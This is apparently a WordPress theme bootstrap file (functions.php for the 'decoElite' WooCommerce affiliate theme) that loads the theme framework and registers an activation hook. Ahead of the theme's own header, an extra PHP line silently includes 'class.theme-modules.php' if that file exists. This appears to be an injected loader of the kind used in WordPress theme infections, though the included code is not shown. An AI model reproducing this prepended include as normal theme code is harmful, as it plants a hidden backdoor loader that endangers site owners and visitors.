<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?><?php 
/**
 * @package WordPress
 * @subpackage:
 *	Name: 	decoElite - Woocommerce Amazon Affiliate Theme
 *	Author: AA-Team
 *	Name: 	http://themeforest.net/user/AA-Team/portfolio
 *	
**/
! defined( 'ABSPATH' ) and exit;

// load the AA-Freamwork init file
$decoElite_theme_path = get_template_directory() . '/'; 
if(class_exists('deco-elite') != true) {
    require_once( $decoElite_theme_path . 'aa-framework/freamwork.class.php' );

	// Initalize the theme
	$decoElite = new decoElite(); 

	// Add an activation hook
	add_action( "after_switch_theme", array( $decoElite, 'activate' ), 10 , 2);
}